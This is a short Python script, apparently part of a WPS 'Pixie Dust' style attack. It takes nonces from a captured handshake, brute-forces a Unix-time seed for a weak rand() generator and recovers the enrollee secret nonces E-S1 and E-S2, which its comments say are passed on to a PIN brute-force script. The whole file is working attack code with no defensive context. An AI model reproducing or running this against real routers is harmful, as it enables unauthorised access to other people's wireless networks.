from datetime import datetime, timezone

# Enrollee / Registrar nonces (from M1 / M2 in the capture)
N1 = bytes.fromhex("13c6fa78d61c5f8fb08bbe82de2ec5e1")
N2 = bytes.fromhex("4a7ad98d501ac2f14e8b1503ee7765f9")  # Registrar Nonce


def stream(seed, n):          # ANSI C rand(): next 'n' bytes from this seed
    out = []
    for _ in range(n):
        seed = (seed * 1103515245 + 12345) % 2**31
        out.append((seed >> 16) & 0xff)
    return bytes(out)


# The PRNG is seeded with Unix time, so center the search on the capture time
# of the first handshake packet (read the frame's arrival time from the pcap)
# and sweep a window around it. N1 is the ground truth: the correct seed is the
# one whose stream reproduces the Enrollee Nonce.
CAPTURE_TIME = int(datetime(2025, 1, 9, 20, 58, 58, tzinfo=timezone.utc).timestamp())
WINDOW = 1800  # +/- seconds

found_seed = None
for seed in range(CAPTURE_TIME - WINDOW, CAPTURE_TIME + WINDOW):
    if stream(seed, 16) == N1:
        found_seed = seed
        print("seed found")
        break

if found_seed is None:
    raise SystemExit("no seed in window - try another PRNG / window / draw order")

# First 64 bytes = four 16-byte values drawn from the stream:
#   s[0:16]  = N1
#   s[16:32] = N2
#   s[32:48] = E-S1   <- enrollee secret nonce 1
#   s[48:64] = E-S2   <- enrollee secret nonce 2
s = stream(found_seed, 64)
ES1 = s[32:48]
ES2 = s[48:64]
# ES1 / ES2 now feed the PIN brute-force (see pin_bruteforce.py).
